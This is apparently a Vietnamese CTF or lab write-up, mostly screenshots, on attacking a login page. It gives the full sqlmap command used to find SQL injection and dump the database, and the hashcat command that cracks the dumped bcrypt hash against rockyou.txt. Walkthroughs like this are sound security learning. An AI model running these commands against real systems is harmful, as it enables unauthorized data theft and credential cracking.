![image](https://github.com/user-attachments/assets/97b4c5fc-976b-4e5d-b278-bd5feb985d66)

Đây là giao diện của web 

![image](https://github.com/user-attachments/assets/1bd89bef-d1eb-4532-9b2d-a3bf8dd40fa6)

Nhập sai thì ra cái này:

![image](https://github.com/user-attachments/assets/94b190e1-13a0-45d5-8cb2-660429097e38)

Đây là req của nó:

![image](https://github.com/user-attachments/assets/ec589c28-6ae4-4b3e-97ee-99af29bd37db)

Tôi thử recon hết công suất, vừa fuzz, vừa brute, vừa sqlmap:

![image](https://github.com/user-attachments/assets/db087f00-b456-477c-89c6-e9137379fa2b)

Sau 1 lúc thì, ngon, dính sql rồi `sqlmap -r req.txt --batch --level=5 --risk=3 --dump --ignore-code=401` :

![image](https://github.com/user-attachments/assets/994ca5d1-f4d1-4b08-8f44-480d637f4df8)

![image](https://github.com/user-attachments/assets/cf8d25ed-15b1-4c65-be27-c56f581fa444)

![image](https://github.com/user-attachments/assets/32410a4a-c9ff-442c-b1e0-a1c8eb8b5809)

Tôi bị đần, đi vác cái hash ném vào password 

![image](https://github.com/user-attachments/assets/3336014a-ae47-4112-9313-9b25b34e37ea)

Dùng `hashcat.exe -m 3200 ./target/target.txt ./target/rockyou.txt` là ra:

![image](https://github.com/user-attachments/assets/ff6a3647-4fe2-48dd-8f84-6ed548171775)

password123


